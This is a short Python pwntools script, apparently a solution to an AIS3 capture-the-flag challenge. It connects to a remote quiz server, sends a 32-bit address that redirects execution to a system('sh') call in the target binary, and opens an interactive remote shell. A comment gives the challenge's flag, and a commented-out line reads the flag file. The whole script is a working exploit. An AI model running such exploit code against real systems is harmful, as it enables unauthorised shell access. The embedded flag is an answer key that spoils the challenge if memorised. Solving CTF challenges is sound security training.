#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#ais3{4nn0y1n9_Wh1t3_SpAcE_CHAR4CTERS}

host = 'quiz.ais3.org'
port = 9561
y = remote(host,port)

'''
08048613         push       0x804875c        -> 'sh'                                    ; argument "command" for method j_system
08048618         call       j_system
'''

y.send( p32( 0x8048613 ) )

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()